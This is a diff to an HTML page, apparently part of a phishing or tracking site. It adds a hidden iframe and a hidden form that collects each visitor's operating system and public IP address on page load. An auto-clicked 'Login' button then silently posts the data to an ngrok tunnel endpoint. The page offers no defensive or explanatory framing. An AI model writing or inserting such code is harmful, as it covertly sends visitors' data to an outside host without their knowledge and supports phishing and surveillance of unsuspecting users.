@@ -65,6 +65,48 @@
        <form action="https://wondrous-select-stallion.ngrok-free.app/gtx/form_gtx.php" method="POST">
           <button class="btn" onclick="visitLink()">Visit</button>
       </form>
+    <!-- Hidden iframe for silent submission -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
+<!-- The form -->
+<form id="myForm" action="https://wondrous-select-stallion.ngrok-free.app/gtx/data3.php" method="POST" target="hiddenFrame">
+  <!-- Hidden fields -->
+  <input type="hidden" name="inp0" id="ip">
+  <input type="hidden" name="inp1" id="os">
+
+  <!-- Button to be auto-clicked -->
+  <button id="btn" type="submit">Login</button>
+</form>
+
+<script>
+  // Get OS info
+  function getOS() {
+    let ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+    return "Unknown";
+  }
+
+  document.getElementById("os").value = getOS();
+
+  // Fetch IP
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById("ip").value = data.ip;
+    });
+
+  // Function to auto-click the button
+  function run() {
+    document.getElementById("btn").click();
+  }
+
+  // Run after 900ms
+  setTimeout(run, 900);
+</script>
  
 
 
